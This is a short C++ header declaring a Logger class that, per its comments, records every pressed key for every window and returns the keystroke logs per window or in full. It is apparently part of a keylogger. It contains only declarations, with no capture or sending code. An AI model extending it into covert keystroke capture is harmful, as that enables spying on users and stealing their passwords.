#pragma once

#include "Utilities.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <map>  

class Logger
{
	// Hold the log of every pressed keys for every window
	map<string, string> Log;

	// Insert(string, string) : Insert into map the key stroke on the window
	void Insert(string window_name, string key_input);

	// Insert(string, int) : Insert into map the key stroke on the window
	void Insert(string window_name, int key_input);

public:

	// Add(string, int) : Add key stroke and the window name to Logger
	void Add(string window_name, int key_stroke);

	// GetLog(string) : Return the key log for a specific window
	string GetLog(string window_name);

	// GetLog(string) : Return all the key log for all window
	string GetLog()  ;
};